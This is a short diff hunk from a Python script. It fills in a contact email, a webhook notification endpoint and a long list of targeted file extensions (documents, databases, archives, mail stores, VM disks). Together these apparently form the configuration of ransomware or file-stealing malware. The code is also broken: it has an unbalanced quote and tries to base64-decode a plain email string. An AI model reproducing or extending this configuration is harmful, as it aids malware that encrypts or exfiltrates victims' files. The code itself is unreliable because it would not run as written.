@@ -16,8 +16,9 @@ import webbrowser
 import sqlite3
 import json
 
-contact_email = base64.b64decode("Email_goes_here_in_base64").decode()
-notification_endpoint = "webhook_goes_here"
+encode_contact_email = "lol@gmail.com""
+contact_email = base64.b64decode(encode_contact_email.encode()).decode()
+notification_endpoint = "https://webhookgoeshere.com"
 
 file_extensions = ['.txt', '.doc', '.xls', '.ppt', '.odt', '.jpg', '.png', '.csv', '.pdf', '.docx', '.xlsx', '.pptx', '.psd', '.ai', '.indd', '.eps', '.raw', '.cr2', '.nef', '.orf', '.sr2', '.db', '.sql', '.mdb', '.accdb', '.dbf', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.dwg', '.dxf', '.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.vmdk', '.vdi', '.key', '.pages', '.numbers', '.sqlite', '.dat', '.json', '.xml', '.bak', '.log', '.ini', '.config', '.reg', '.lnk', '.url', '.bookmark', '.history', '.cache']
 
